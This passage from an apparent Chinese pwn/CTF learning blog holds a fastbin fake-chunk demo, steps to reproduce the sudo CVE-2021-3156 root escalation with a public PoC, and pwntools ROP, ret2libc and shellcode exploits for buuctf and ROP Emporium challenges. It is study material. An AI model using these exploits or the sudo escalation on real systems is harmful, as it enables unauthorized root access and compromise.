sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); fprintf(stderr, \"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\"); fprintf(stderr, \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\"); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, \"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\\n\"); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr, \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", &amp;fake_chunks[1]); fprintf(stderr, \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\"); a = &amp;fake_chunks[2]; fprintf(stderr, \"Freeing the overwritten pointer.\\n\"); free(a); fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, \"malloc(0x30): %p\\n\", malloc(0x30)); } 首先用malloc(1)进行了初始化，然后用一个fake_chunks数组来模拟两个fake_chunk，一个位于0下标的位置，一个位于8下标的位置，1下标是第一个chunk的size，9下标是第二个chunk的size。 因为第一个chunk的大小为64字节，64位系统环境下8字节一个数字，所以从0下标开始，到8下标之前刚好64个字节，那么下一个chunk就正好连在他的后面，所以第二个chunk从8下标位置开始是prev_size,9下标是size，next size的检查要检查下一个chunk的size是否合法，所以9下标size这个值必须是合法的size值，所以给他赋值为合法值。 然后free第一个chunk，通过了检测之后下一次分配相应大小的chunk就会把这个第一个chunk分配出来了","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"https://torebtr.github.io/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://torebtr.github.io/tags/pwn/"}]},{"title":"cve_2001_3156","date":"2021-03-13T07:34:44.000Z","path":"2021/03/13/cve-2001-3156/","text":"Linux sudo权限提升漏洞（CVE-2021-3156）复现漏洞详情2021年01月26日，sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”），可导致本地权限提升。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。 影响范围Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 测试系统是否易受此漏洞影响： 以非root用户身份登录系统。 运行命令“sudoedit -s /” 如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响；如果出现以“ usage：”开头的错误响应，则表示该漏洞已被补丁修复。 漏洞复现环境：ubuntu20.04虚拟机，sudo 1.8.31实现： 版本符合要求，通过运行命令“sudoedit -s /”检测是否真正存在漏洞 经检测漏洞存在 注：版本符合要求，漏洞不一定存在，如： Poc地址: https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz 执行进入目录并执行 cd CVE-2021-3156 make ./sudo-hax-me-a-sandwich make并运行文件 查看到可用选项，后提升权限./sudo-hax-me-a-sandwich 1 //结尾的1代表第几个选项","link":"","categories":[],"tags":[{"name":"-CVE","slug":"CVE","permalink":"https://torebtr.github.io/tags/CVE/"}]},{"title":"mark_of_practice","date":"2021-03-13T07:33:44.000Z","path":"2021/03/13/mark-of-practice/","text":"最近在入门堆，但是基础实在有点多，可是不会基础的话又看不懂题，所以堆的题也没怎么搞，只能刷点简单题来水，生活不易啊。 水题：ret2libc：buu ciscn_2019_en_2from pwn import * from LibcSearcher import * context.os='linux' context.arch='amd64' context.log_level='debug' p = remote('node3.buuoj.cn',26863) #p = process('./ciscn_2019_en_2') elf = ELF('./ciscn_2019_en_2') puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] main_addr = 0x400B28 #ROPgadget查找 ret = 0x00400C84 pop_rdi = 0x00400c83 # pop rdi ; ret p.sendlineafter('choice!\\n','1') #payload = flat(['\\0', 'a'*0x57, pop_di, puts_got, puts_plt, main_addr]) payload = 'a'*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) p.sendlineafter('encrypted\\n',payload) p.recvline() p.recvline() #puts_addr = u64(r.recv(8)) puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\0')) #puts_addr= u64(r.recvline()[:-1].ljust(8, '\\x00')) #print(puts_addr) #print(hex(puts_addr)) libc = LibcSearcher('puts', puts_addr) libcbase = puts_addr - libc.dump('puts') sys_addr = libcbase + libc.dump('system') binsh_addr = libcbase + libc.dump('str_bin_sh') p.sendlineafter('choice!\\n','1') #payload = flat(['\\0', 'a'*0x57, ret, pop_di, binsh_addr, sys_addr]) payload = 'a'*0x58+ p64(ret)+ p64(pop_rdi)+ p64(binsh_addr)+ p64(sys_addr) p.sendlineafter('encrypted\\n',payload) p.interactive() bjdctf_2020_babystackfrom pwn import* r=remote('node3.buuoj.cn',26025) shell_addr=0x4006e6 r.sendline('100') payload='a'*(0x10+8)+p64(shell_addr) r.sendline(payload) r.interactive() [HarekazeCTF2019]baby_ropfrom pwn import * context(log_level = 'debug', arch = 'i386', os = 'linux') #p = process('./babyrop') p = remote('node3.buuoj.cn',26310) #0x00400683 : pop rdi ; ret pop_rdi = 0x00400683 sys_addr = 0x004005E3 bin_sh_addr = 0x00601048 payload = 'a'*0x18 + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr) p.sendline(payload) p.interactive() ciscn_2019_n_5#coding=utf-8 from pwn import * context(os='linux',arch='amd64', log_level = 'debug') #sh = process('./ciscn_2019_n_5') sh = remote('node3.buuoj.cn',25696) elf = ELF('./ciscn_2019_n_5') bss_addr = 0x601080 #shellcode =\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\" shellcode = asm(shellcraft.sh()) #生成64位linuxshellcode payload = 'a'*0x28 + p64(bss_addr) #栈溢出ret到shellcode执行 sh.sendlineafter(\"name\\n\",shellcode) sh.sendlineafter(\"me?\\n\",payload) sh.interactive()","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"https://torebtr.github.io/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://torebtr.github.io/tags/pwn/"}]},{"title":"problem_blog","date":"2021-03-13T07:32:22.000Z","path":"2021/03/13/problem-blog/","text":"由于本人博客搭在虚拟机上，而虚拟机又经常出事，很不幸，爷碰上了。。。。。。。。。 起因的的图片没了，大概就是我要更新博客，把md文件放上去之后，本地部署毫无问题，上传到远程的时候出事了，让我确认是否有远程仓库，给爷整蒙了。 刚开始以为是ssh的原因，我重新生成，然后把原来的删掉了，然后添加了新的具体过程如下： ssh-keygen -t rsa -C \"youremail@example.com\" 在本地生成 .ssh 文件夹，然后复制其中的id_rsa.pub中的内容放到github中setting上的SSH中 这就添加完毕了，然后验证 ssh -T git@github.com # github地址 如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到： Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access. 看到这个信息说明SSH已配置成功！ 而我的就没有，显示 Permission denied 很无奈，后来查百度后发现是自己的本机的这个git仓库并没有和这个SSH key 关联上 ssh-agent bash ssh-add \"/home/ubuntu/.ssh/id_rsa\" 回显 Identity added: /home/ubuntu/.ssh/id_rsa (/home/ubuntu/.ssh/id_rsa) 然后hexo d成功部署","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"https://torebtr.github.io/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"problems","slug":"problems","permalink":"https://torebtr.github.io/tags/problems/"}]},{"title":"第一次讲课","date":"2021-03-13T07:29:16.000Z","path":"2021/03/13/第一次讲课/","text":"pwn知识什么是pwnPwn可以简单概括为软件的漏洞的挖掘和利用（二进制攻防）。 涉及到的知识涉及计算机学科的众多方向，而且大多偏底层。包括不限于，C语言，C++，python，数 据结构，计算机组成原理，操作系统，编译原理，计算机网络等。 linux基础虚拟机：Ubuntu版本不限（但是以后做题的时候会用到不同版本的Ubuntu，具体题目具体分析） 基本命令： ls命令 dir就是 list 的缩写，通过 ls 命令不仅可以查看 linux 文件夹包含的文件，而且可以查看文件权限(包括目录、文件夹、文件权限)查看目录信息等等。 cd 命令cd(changeDirectory) 命令语法： cd [目录名] 说明：切换当前目录至 dirName。 mkdir filename创建文件夹。 python安装sudo apt-get install python 安装。（只能安装库中有的软件程序） sudo apt-get update sudo apt-get upgrade 安装 git，gdb sudo apt-get install git sudo apt-get install gdb pip安装 sudo apt-get install python3-pip 安装pwntools pip3 install pwntools PWN类型栈漏洞，堆漏洞，格式化字符串漏洞，整型漏洞，逻辑漏洞 buuctf 第二排第三个 level0 pwn练习ROP Emporiumret2win测偏移cyclic 0x32 cyclic(0x32).find(‘kaaalaaam’) 找到system函数地址 expfrom pwn import * context.log_level='debug' p = process('./ret2win') p = remote('',***) system_addr = 0x0400824 payload = 'a'*40+p64(system_addr) #0x20+8 p.sendline(payload) p.interactive() splitx64传参方式：当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样 需要bin/sh或者cat flag 测偏移，详情见上题 使用ROPgadget ROPgadget --binary ./split --only'pop|ret' expfrom pwn import * p = process('./split') #elf = ELF('./split') system_addr = 0x00400810 #system_addr = elf.symbols['system'] cat_flag_addr = 0x00601060 pop_rdi_ret = 0x00400883 payload = 'A'*40+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr) p.sendline(payload) p.interactive() callmeIDA 启动！字符串分析 IDA_字符串检查 libcallme.so : 之前文件夹里面的libcallme库 callme one/two/three : 可能为libcallme中的函数 usefulFuction 这个函数使得我们可以调用callme one/two/three,并且得知这三个函数分别需要三个参数 libcallme.so libcallme 果然，三个函数在这里 函数分析1.callme_one callme_one 发现它的作用是读取已经加密了的flag.txt 2.callme_two callme_two 发现是利用key1.dat进行一些解密工作 3.callme_three callme_three 和callme_two差不多，也是进行解密工作 分析漏洞点函数 pwnme 是pwnme函数的一个fgets溢出漏洞 同样得到偏移值0x20+8 查看plt表 plt表 得到地址 callme_one = 0x401850 callme_two = 0x401870 callme_three = 0x401810 思路 使用ROP实现跳转 使用plt表调用函数关于plt表：GOT表和PLT表知识详解 PLT表中的每一项的数据内容都是对应的GOT表中一项的地址这个是固定不变的，到这里大家也知道了PLT表中的数据根本不是函数的真实地址，而是GOT表项的地址 其实在大家进入带有@plt标志的函数时，这个函数其实就是个过渡作用，因为GO表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。 expfrom pwn import * context.log_level = 'debug' #context.terminnal = ['gnome-terminal','-e'] p = process('./callme') elf = ELF('./callme') #0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret pppad = 0x00401ab0 callme_three = elf.plt['callme_three'] callme_two = elf.plt['callme_two'] callme_one = elf.plt['callme_one'] #gdb.attach(p) payload = 'a' * 40 payload += p64(pppad+3) payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_one) payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_two) payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_three) p.recvuntil('&gt;') p.sendline(payload) p.interactive()","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"https://torebtr.github.io/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://torebtr.github.io/tags/pwn/"}]},{"title":"Hello World","date":"2021-03-13T05:53:10.160Z","path":"2021/03/13/hello-world/","text":"第n次搭建博客终于成功，过去失败的经验告诉我们不要整些花里胡哨的东西，搞个简单点的主题就行，要不然hexo的各种插件会搞死你，网速好的话可能一会就弄完了，像我这种穷b没钱搭梯子，只能慢慢更新。好了希望看到我文章的各位师傅们轻点喷，也希望师傅们万事如意。（狗头保命）。 Startnew worldprint('Hello World!')","link":"","categories":[],"tags":[]},{"title":"ROPempire","date":"2020-10-01T17:25:52.000Z","path":"2020/10/02/ROPempire/","text":"##ret2win from pwn import * p = process('./ret2win') system_addr = 0x0400824 pad = 'a'*0x20+'deadbeef' payload = pad+p64(system_addr) p.sendline(payload) p.interactive() ##split考察将字符串通过寄存器存到函数当中，要熟练掌握x86与x64的传参规律. from pwn import * p = process('./split') #elf = ELF('./split') system_addr = 0x00400810 #system_addr = elf.symbols['system'] cat_flag_addr = 0x00601060 pop_rdi_ret = 0x00400883 pad = 'A'*40 payload = pad+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr) p.sendline(payload) p.interactive() ##callme对参数传递的考察 from pwn import * context.log_level = 'debug' p = process('./callme') elf = ELF('./callme') # info # gadget pppr = 0x0000000000401ab0 # pop rdi ; pop rsi ; pop rdx ; ret callme_three = 0x401810 callme_two = 0x401870 callme_one = 0x401850 # rop1 offset = 40 payload = '\\0'*offset payload += p64(pppr+3) payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_one) payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_two) payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_three) # debug() p.recvuntil('&gt;') p.sendline(payload) p.interactive() ##write4考察通过将字符串写入.bss段来将字符串传递给system函数然后getshell，同时考察gadget的选取与对段的理解。 from pwn import * context.log_level = 'debug' p = process('./write4') sys_addr = 0x00400810 bss_addr = 0x601060 mov_r14_r15 = 0x400820 pop_r14_r15 = 0x400890 pop_rdi = 0x400893 payload = 'a'*(0x20+8) payload += p64(pop_r14_r15) #清空寄存器 payload += p64(bss_addr) #向r14中写入bss段地址 payload += \"/bin/sh\".ljust(8,\"\\x00\") #向r15中写入/bin/sh\\x00 payload += p64(mov_r14_r15) #将r15中的字符串写入r14 payload += p64(pop_rdi) #清空rdi payload += p64(bss_addr) #向rdi中写入bss中的字符串 payload += p64(sys_addr) #rdi向system传参 p.recvuntil('&gt;') p.sendline(payload) p.recv() p.interactive() ##badchars from pwn import * p = process('./badchars') elf = ELF('./badchars') context.log_level = 'debug' # gadget prdi = 0x400b39 p1213 = 0x400b3b m1213 = 0x400b34 system = 0x04009E8 #system = elf.plt['system'] p1415 = 0x400b40 x1415 = 0x400b30 ''' 0x400b30 &lt;usefulGadgets&gt;: xor BYTE PTR [r15],r14b 0x400b33 &lt;usefulGadgets+3&gt;: ret 0x400b34 &lt;usefulGadgets+4&gt;: mov QWORD PTR [r13+0x0],r12 0x400b38 &lt;usefulGadgets+8&gt;: ret 0x400b39 &lt;usefulGadgets+9&gt;: pop rdi =&gt; 0x400b3a &lt;usefulGadgets+10&gt;: ret 0x400b3b &lt;usefulGadgets+11&gt;: pop r12 0x400b3d &lt;usefulGadgets+13&gt;: pop r13 0x400b3f &lt;usefulGadgets+15&gt;: ret 0x400b40 &lt;usefulGadgets+16&gt;: pop r14 0x400b42 &lt;usefulGadgets+18&gt;: pop r15 0x400b44 &lt;usefulGadgets+20&gt;: ret ''' # rop1 offset = 40 payload = 'A'*offset # filtered: bic/ fns # $0 is okay, but use gadget x1415 to get /bin/sh via xor is the goal (too lazy to write exp) payload += p64(p1213) + '$0\\0\\0\\0\\0\\0\\0' + p64(elf.bss()+0x400) + p64(m1213) payload += p64(prdi) + p64(elf.bss()+0x400) + p64(system) # debug() p.recvuntil('&gt;') p.sendline(payload) p.interactive()","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"https://torebtr.github.io/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://torebtr.github.io/tags/pwn/"}]}]